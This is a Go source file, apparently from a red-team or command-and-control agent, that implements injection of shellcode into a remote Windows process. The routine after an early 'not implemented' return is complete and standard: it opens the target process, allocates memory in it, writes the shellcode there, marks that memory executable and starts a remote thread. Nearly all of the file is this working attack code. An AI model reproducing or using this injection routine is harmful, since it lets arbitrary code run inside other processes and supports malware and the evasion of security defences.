// +build windows

package libinject

import "C"
import (
	"errors"
	"log"
	"syscall"
	"unsafe"

	"pkg/utils/winapi"
)

type WindowsInjection struct {
	Target     int
	Successful bool
	Payload    []byte
	Method     string
}

func (l *WindowsInjection) TargetPid() int {
	return l.Target
}

func (l *WindowsInjection) Success() bool {
	return l.Successful
}

func (l *WindowsInjection) Shellcode() []byte {
	return l.Payload
}

func injectLibrary(pid int, lib string) (WindowsInjection, error) {
	return WindowsInjection{}, errors.New("Not implemented for Windows.")
}

func injectShellcode(pid uint32, arch string, shellcode []byte) (WindowsInjection, error) {
	// oldregs := syscall.PtraceRegs{}

	return WindowsInjection{}, errors.New("Not implemented. Try shinject instead.")

	res := WindowsInjection{}
	res.Payload = shellcode
	res.Target = int(pid)
	res.Successful = false
	res.Method = "CreateRemoteThread"
	hProcess, err := syscall.OpenProcess(winapi.PROCESS_CREATE_THREAD|winapi.PROCESS_VM_OPERATION|winapi.PROCESS_VM_WRITE|winapi.PROCESS_QUERY_INFORMATION|winapi.PROCESS_VM_READ, false, pid)
	if err != nil {
		return res, err
	}
	var zero int = 0
	zeroPtr := uintptr(zero)
	defer syscall.CloseHandle(hProcess)
	is64, _ := winapi.IsWow64Process(hProcess)
	if is64 && arch != "x64" {
		return res, errors.New("Error: Target process is x64, given x86 shellcode.")
	} else if !is64 && arch == "x64" {
		return res, errors.New("Error: Target process is x86, given x64 shellcode.")
	}

	hMemorySegment, err := winapi.VirtualAllocEx(
		hProcess,
		zeroPtr,
		uint32(len(shellcode)),
		winapi.MEM_COMMIT|winapi.MEM_RESERVE,
		// syscall.PAGE_READWRITE)
		syscall.PAGE_EXECUTE_READWRITE)

	if err != nil {
		log.Println("Erorr allocating memory:", err.Error())
		return res, err
	}

	log.Println("hMemorySegment:", hMemorySegment)
	_, err = winapi.WriteProcessMemory(
		hProcess,
		hMemorySegment,
		unsafe.Pointer(&shellcode[0]),
		uint32(len(shellcode)))

	if err != nil {
		log.Println("Error writing process memory:", err.Error())
		return res, err
	}

	var oldProtect uint32
	log.Println("WriteProcessMemory successful!")
	err = winapi.VirtualProtectEx(
		hProcess,
		hMemorySegment,
		uint32(len(shellcode)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)))

	log.Println("OldProtect:", oldProtect)

	if err != nil {
		log.Println("Error reprotecting memory:", err.Error())
		return res, err
	}

	// log.Println("VirtualProtectEx successful!")
	_, err = winapi.CreateRemoteThread(hProcess, zeroPtr, 0, hMemorySegment, zeroPtr, 0, zeroPtr)
	if err != nil {
		log.Println("Error creating remote thread:", err.Error())
		return res, err
	}
	// log.Println("Created remote thread!")
	res.Successful = true
	return res, nil
}
